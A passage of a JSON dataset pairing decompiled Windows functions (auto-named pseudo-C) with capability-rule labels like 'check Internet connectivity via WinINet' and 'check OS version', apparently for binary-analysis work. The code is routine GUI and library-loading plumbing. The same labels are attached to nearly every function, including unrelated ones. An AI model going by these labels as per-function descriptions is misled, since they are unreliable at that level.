        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00477228(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar2 = fcn.0046d1c8();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.0046d190();\n            if ((((*(piVar3 + 0x45) != '\\0') && (*(piVar3 + 0x41) == '\\0')) && (*(piVar3 + 0x42) == '\\0')) &&\n               (cVar1 = (**(*piVar3 + 0x84))(),  cVar1 != '\\0')) {\n                fcn.0046d908();\n                arg_8h = 0;\n                fcn.0046dd78();\n                var_ch = 0;\n                var_8h._0_1_ = 0xb;\n                fcn.0040675c(&var_ch);\n                fcn.0046bc4c(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 354
    },
    "00477340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00477340(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0x22) != '\\0') {\n        return 0;\n    }\n    if ((*(in_EAX + 0x9d) - 1U < 3) && (cVar1 = fcn.00476bb4(),  cVar1 == '\\0')) {\n        fcn.00476ab8();\n        cVar1 = (**(*in_EAX + 0x1b8))();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 150
    },
    "00477530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00477530(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x84))();\n    (**(*in_EAX + 0xac))();\n    uVar1 = *(in_EAX + 0x9d) - 2;\n    if (uVar1 < 2) {\n        fcn.004762d4();\n        if (*(in_EAX + 0xa2) == '\\0') {\n            (**(*in_EAX + 0x20c))();\n            return;\n        }\n        (**(*in_EAX + 0x24c))();\n    }\n    else if (uVar1 == 2) {\n        (**(*in_EAX + 0x24c))();\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00477e39": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0047809c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047809c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack36 = &fcn.0047809c::var_1h + 1;\n    uStack40 = 0x4781b8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x4780d5;\n    piVar1 = fcn.00455920();\n    uStack52 = 0x478196;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &fcn.0047809c::var_1h + 1;\n    fcn.0043d878();\n    fcn.0043d878();\n    var_1h._0_1_ = 0;\n    if (arg_8h == '\\0') {\n        if (*in_EDX == 0) {\n            fcn.00458140();\n        }\n    }\n    else {\n        (**(*piVar1[200] + 100))();\n    }\n    iVar2 = (**(*piVar1 + 0xec))();\n    if (iVar2 == 1) {\n        fcn.0043d848();\n        fcn.0040461c();\n        fcn.0043d848();\n        fcn.0040461c();\n        var_1h._0_1_ = 1;\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x47819d;\n    uStack52 = 0x478195;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 486
    },
    "004781cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004781cc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack36 = &fcn.004781cc::var_1h + 1;\n    uStack40 = 0x47837a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x4781fe;\n    piVar1 = fcn.00455920();\n    uStack52 = 0x478350;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &fcn.004781cc::var_1h + 1;\n    fcn.0040675c();\n    fcn.0043d878();\n    fcn.0043d768();\n    fcn.0043d768();\n    fcn.0043d768();\n    fcn.0043d028();\n    fcn.0043cfdc();\n    fcn.0043cfdc();\n    fcn.0043d028();\n    fcn.0043d878();\n    if (*in_EAX == 0) {\n        fcn.00458140();\n    }\n    iVar2 = (**(*piVar1 + 0xec))();\n    if (iVar2 == 1) {\n        fcn.0043d848();\n        fcn.0040461c();\n        fcn.0043d848();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x478357;\n    uStack52 = 0x47834f;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 483
    },
    "00478764": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00478764(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4787de;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0043d848();\n    (**(**(in_EAX + 0x300) + 100))();\n    (**(**(in_EAX + 0x304) + 100))();\n    (**(**(in_EAX + 0x30c) + 100))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4787e5;\n    uStack24 = 0x4787dd;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 211
    },
    "00478e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00478e10(void)\n\n{\n    if (*0x485c44 == 0) {\n        *0x485c44 = sub.kernel32.dll_LoadLibraryA(0x478fdc);\n        if (*0x485c44 < 0x20) {\n            *0x485c44 = 0;\n            return 0;\n        }\n        *0x485c48 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x478fe8);\n        *0x485c4c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x478ff8);\n        *0x485c50 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47900c);\n        *0x485c54 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479020);\n        *0x485c58 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47900c);\n        *0x485c5c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479020);\n        *0x485c60 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479038);\n        *0x485c64 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47904c);\n        *0x485c68 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479064);\n        *0x485c6c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47907c);\n        *0x485c70 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47908c);\n        *0x485c74 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x47909c);\n        *0x485c78 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790b8);\n        *0x485c7c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790cc);\n        *0x485c80 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790e8);\n        *0x485c84 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790b8);\n        *0x485c88 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790cc);\n        *0x485c8c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x4790e8);\n        *0x485c90 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479104);\n        *0x485c94 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479118);\n        *0x485c98 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479134);\n        *0x485c9c = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479150);\n        *0x485ca0 = sub.kernel32.dll_GetProcAddress_1(*0x485c44, 0x479164);\n    }\n    return 1;\n}\n",
        "token_count": 778
    },
    "0047a080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a080(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack68;\n    uint uStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0xc) == 0) {\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            piVar2 = fcn.0042b3a8();\n            uStack64 = 0x47a125;\n            uStack68 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffbc;\n            (**(*piVar2 + 8))();\n            fcn.0042cb50();\n            fcn.0042cb84();\n            *in_FS_OFFSET = uStack68;\n            uStack64 = 0x47a124;\n            fcn.00403820();\n            return;\n        }\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.004039b8();\n            if (cVar1 == '\\0') {\n                piVar2 = fcn.00429710();\n                uStack64 = 0x47a235;\n                uStack68 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffbc;\n                fcn.00429364();\n                (**(*piVar2 + 0x40))();\n                fcn.0042937c();\n                (**(*piVar2 + 0x34))();\n                puStack76 = 0x47a1cc;\n                fcn.004293d4(0);\n                uStack80 = 0x47a209;\n                uStack84 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffac;\n                uVar3 = *(*(in_EAX + 0x1c) + 0xc);\n                puStack76 = &stack0xfffffffc;\n                fcn.00426bfc(uVar3);\n                *in_FS_OFFSET = uVar3;\n                uStack80 = 0x47a210;\n                uStack84 = 0x47a208;\n                fcn.00403820();\n                return;\n            }\n            fcn.00428f64();\n            fcn.0042999c();\n        }\n        else {\n            fcn.00428f4c();\n            fcn.0042cdd4();\n        }\n        uVar3 = fcn.00406298();\n        uStack64 = 0x47a268;\n        fcn.0047a894(uVar3);\n        uStack64 = 0x47a26d;\n        fcn.00465b2c();\n        uStack64 = 0x47a27a;\n        fcn.00479900();\n    }\n    uStack64 = 0x47a28d;\n    fcn.004062dc();\n    return;\n}\n",
        "token_count": 735
    },
    "004796a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004796a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00402bb4();\n    cVar1 = fcn.004039b8();\n    if ((cVar1 != '\\0') && (*(iVar2 + 0xc) < 0)) {\n        return *(iVar2 + 0xc);\n    }\n    return 0x8000ffff;\n}\n",
        "token_count": 97
    },
    "0047971c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047971c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == 0) {\n        fcn.00479fb8();\n        fcn.004062b0();\n    }\n    fcn.004062dc();\n    return;\n}\n",
        "token_count": 70
    },
    "004796cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004796cc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x20) == 0) {\n        fcn.00479a44();\n        fcn.004062b0();\n    }\n    fcn.004062dc();\n    return;\n}\n",
        "token_count": 69
    },
    "00479900": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00479900(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffe4;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x479912;\n    fcn.0040630c();\n    uStack20 = 0x479968;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xc) != 0) {\n        in_stack_ffffffe4 = 0x47992d;\n        puStack16 = &stack0xfffffffc;\n        fcn.00479984();\n    }\n    if (param_2 != 0) {\n        in_stack_ffffffe4 = in_EAX + 0x10;\n        fcn.00465e18(in_stack_ffffffe4);\n    }\n    fcn.004062b0();\n    *in_FS_OFFSET = in_stack_ffffffe4;\n    uStack20 = 0x47996f;\n    iStack24 = 0x479967;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 299
    },
    "00479a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00479acd)\n// WARNING: Removing unreachable block (ram,0x00479b05)\n// WARNING: Removing unreachable block (ram,0x00479b08)\n// WARNING: Removing unreachable block (ram,0x00479b1b)\n// WARNING: Removing unreachable block (ram,0x00479b1e)\n// WARNING: Removing unreachable block (ram,0x00479b31)\n// WARNING: Removing unreachable block (ram,0x00479b34)\n// WARNING: Removing unreachable block (ram,0x00479b47)\n// WARNING: Removing unreachable block (ram,0x00479b4a)\n\nvoid fcn.00479a80(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x479c24;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    if (*(in_EAX + 0x18) == '\\0') {\n        fcn.004062dc();\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x479c2b;\n    uStack56 = 0x479c13;\n    fcn.004045c8();\n    uStack56 = 0x479c1b;\n    fcn.00406298();\n    uStack56 = 0x479c23;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 403
    },
    "0047a300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047a300(int32_t *param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    bool bVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    int16_t var_ch;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (in_EAX[10] != 0) {\n        puStack36 = 0x47a322;\n        var_4h = param_2;\n        fcn.00426d58();\n        uStack40 = 0x47a3fe;\n        uStack44 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd4;\n        puStack36 = &stack0xfffffffc;\n        uVar1 = fcn.0042704c();\n        var_8h = (**(*in_EAX + 0x24))();\n        var_9h = 0;\n        bVar4 = var_8h != 0;\n        if (bVar4) {\n            var_8h = sub.gdi32.dll_SelectPalette(uVar1, var_8h, 0xffffffff);\n            sub.gdi32.dll_RealizePalette(uVar1);\n        }\n        var_9h = bVar4;\n        (**(*in_EAX[10] + 0x14))(in_EAX[10], &stack0xfffffff0);\n        if (var_ch == 4) {\n            (**(*in_EAX[10] + 0xc))(in_EAX[10], &fcn.0047a300::var_10h);\n            uVar3 = uVar1;\n            sub.gdi32.dll_PlayEnhMetaFile(uVar1, var_10h, param_1);\n        }\n        else {\n            iVar2 = fcn.0047a4b0(param_1);\n            uVar3 = fcn.0047a4cc(-iVar2);\n            iVar2 = fcn.0047a4b0(uVar3);\n            uVar3 = 0;\n            (**(*in_EAX[10] + 0x20))\n                      (in_EAX[10], uVar1, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], 0, \n                       iVar2 + -1);\n            fcn.00465b2c();\n        }\n        if (var_9h != '\\0') {\n            sub.gdi32.dll_SelectPalette(uVar1, var_8h, 0xffffffff);\n        }\n        *in_FS_OFFSET = uVar3;\n        fcn.00426f44(0x47a405);\n        return;\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "0047a4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047a4b0(void)\n\n{\n    int32_t in_EAX;\n    uint uStack4;\n    \n    uStack4 = 0;\n    if (*(in_EAX + 0x28) != 0) {\n        (**(**(in_EAX + 0x28) + 0x1c))(*(in_EAX + 0x28), &uStack4);\n    }\n    return CONCAT44(uStack4, uStack4);\n}\n",
        "token_count": 104
    },
    "0047a4cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047a4cc(void)\n\n{\n    int32_t in_EAX;\n    uint uStack4;\n    \n    uStack4 = 0;\n    if (*(in_EAX + 0x28) != 0) {\n        (**(**(in_EAX + 0x28) + 0x18))(*(in_EAX + 0x28), &uStack4);\n    }\n    return CONCAT44(uStack4, uStack4);\n}\n",
        "token_count": 102
    },
    "0047a788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a788(void)\n\n{\n    if (*0x485cb0 == 0) {\n        *0x485cb0 = fcn.0040e6fc();\n        if (*0x485cb0 != 0) {\n            *0x485cb4 = sub.kernel32.dll_GetProcAddress_1(*0x485cb0, 0x47a81c);\n            *0x485cb8 = sub.kernel32.dll_GetProcAddress_1(*0x485cb0, 0x47a834);\n            *0x485cbc = sub.kernel32.dll_GetProcAddress_1(*0x485cb0, 0x47a84c);\n            *0x485cc0 = sub.kernel32.dll_GetProcAddress_1(*0x485cb0, 0x47a868);\n        }\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "0047a878": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047a878(void)\n\n{\n    uint uVar1;\n    \n    if (*0x485cb8 != NULL) {\n        uVar1 = (**0x485cb8)();\n        return uVar1;\n    }\n    return 0x8000ffff;\n}\n",
        "token_count": 61
    },
    "0047a894": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047a894(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*0x485cbc == NULL) {\n        uVar1 = 0x8000ffff;\n    }\n    else {\n        uVar1 = (**0x485cbc)();\n    }\n    return uVar1;\n}\n",
        "token_count": 73
    },
    "0047a8bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047a8bc(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47a8d1;\n    fcn.0040630c();\n    uStack24 = 0x47a91b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*0x485cc0 != NULL) {\n        puStack20 = &stack0xfffffffc;\n        (**0x485cc0)(in_EAX);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47a922;\n    uStack24 = 0x47a91a;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 206
    },
    "0047a92c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a92c(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffe0;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x47a981;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x485ca8 = *0x485ca8 + 1;\n    if (*0x485ca8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x485cac != 0) {\n            in_stack_ffffffe0 = *0x485cac;\n            sub.user32.dll_SendMessageA(*0x485cac, 0x10, 0, 0);\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x485cb0 != 0) {\n            sub.kernel32.dll_FreeLibrary_1(*0x485cb0);\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffe0;\n    return;\n}\n",
        "token_count": 269
    },
    "0047da64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0047da64(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint noname_5, \n            int32_t arg_20h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_10h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x47dbf3;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    if ((((arg_18h & 2) != 0) && (arg_20h != 0)) && (arg_ch + 0x2cbU < 0xf)) {\n    // switch table (15 cases) at 0x47dab4\n        switch(*((arg_ch + 0x2cbU) * 4 + 0x47dab4)) {\n        case 0x47daf0:\n            fcn.004148d0();\n            break;\n        case 0x47db01:\n            puStack52 = &stack0xfffffffc;\n            fcn.0047b32c();\n            fcn.004107fc();\n            break;\n        case 0x47db1b:\n            puStack52 = &stack0xfffffffc;\n            fcn.0047b264();\n            fcn.004107fc();\n            break;\n        case 0x47db49:\n            puStack52 = &stack0xfffffffc;\n            fcn.004148d0();\n            break;\n        case 0x47db5a:\n            puStack52 = &stack0xfffffffc;\n            sub.kernel32.dll_GetUserDefaultLCID();\n            fcn.004148d0();\n            break;\n        case 0x47db6c:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47db77:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47db8a:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47db9a:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47dba5:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47dbb0:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n            break;\n        case 0x47dbbb:\n            puStack52 = &stack0xfffffffc;\n            fcn.00414aa0();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x47dbfa;\n    uStack56 = 0x47dbf2;\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 691
    },
    "0047d724": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
